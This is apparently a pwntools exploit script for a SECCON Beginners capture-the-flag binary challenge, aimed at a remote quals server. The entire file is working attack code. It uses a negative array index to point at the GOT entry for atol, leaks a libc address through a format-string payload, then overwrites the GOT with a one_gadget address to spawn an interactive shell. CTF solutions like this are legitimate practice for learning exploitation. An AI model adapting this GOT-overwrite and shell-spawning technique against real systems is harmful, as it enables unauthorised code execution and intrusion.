from pwn import *
import sys

#import kmpwn
#sys.path.append('/home/vagrant/kmpwn')
#from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "es.quals.beginners.seccon.jp"
PORT = 9003 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_printf = elf.plt["printf"]
got_atol = elf.got["atol"]

#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc-2.27.so')
#libc_binsh = next(libc.search("/bin/sh"))
off_ret_main_b97 = 0x7ffff7a05b97 - 0x7ffff79e4000
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def exploit():
	"""
	_x54 i
	_x50 buffer 
	_x48 v 
	_x40 x[]
	"""
	conn.sendafter("index: ", "-2")	
	conn.sendafter("value: ", str(got_atol-0x8))	
	payload = "%25$p,AA"
	payload += p64(plt_printf)
	conn.sendafter("index: ", payload) 
	libc_ret_main_b97 = int(conn.recvuntil(",")[:-1],16)
	libc_base = libc_ret_main_b97 - off_ret_main_b97
	print hex(libc_base)	

	one_gadget = libc_base + gadget[2]
	payload = "A"*8
	payload += p64(one_gadget)
	conn.sendafter("value: ", payload)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
